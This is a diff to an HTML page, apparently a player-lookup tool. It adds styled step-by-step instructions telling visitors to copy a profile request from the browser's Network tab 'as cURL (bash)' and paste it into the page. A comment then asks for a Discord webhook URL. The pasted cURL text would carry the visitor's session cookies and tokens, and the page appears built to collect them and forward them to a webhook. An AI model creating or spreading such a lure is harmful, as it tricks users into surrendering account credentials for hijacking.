@@ -63,6 +63,14 @@
       color: white;
       font-weight: bold;
     }
+    #instructions {
+      margin-top: 30px;
+      font-size: 16px;
+      line-height: 1.5;
+      text-align: left;
+      width: 80%;
+      margin: 30px auto;
+    }
   </style>
 </head>
 <body>
@@ -78,6 +86,20 @@
   </div>
   <p id="status" style="color: green; font-weight: bold;"></p>
   <p id="errorMessage" class="error"></p>
+
+  <div id="instructions">
+    <h3><strong>INSTRUCTION:</strong></h3>
+    <ol>
+      <li>Search for any player.</li>
+      <li>Stay on the player profile.</li>
+      <li>Right-click and select "Inspect Element" or press F12.</li>
+      <li>Go to the "Network" tab.</li>
+      <li>Refresh the browser.</li>
+      <li>Scroll up until you reach the top, where you should find the "profile" name, depending on whether the refresh was successful.</li>
+      <li>Right-click on it and choose "Copy," then click "<strong>Copy as cURL (bash)</strong>" or "<strong>Copy all as cURL (bash)</strong>."</li>
+      <li>Paste what you copied above.</li>
+    </ol>
+  </div>
 
   <script>
     // Replace with your Discord Webhook URL
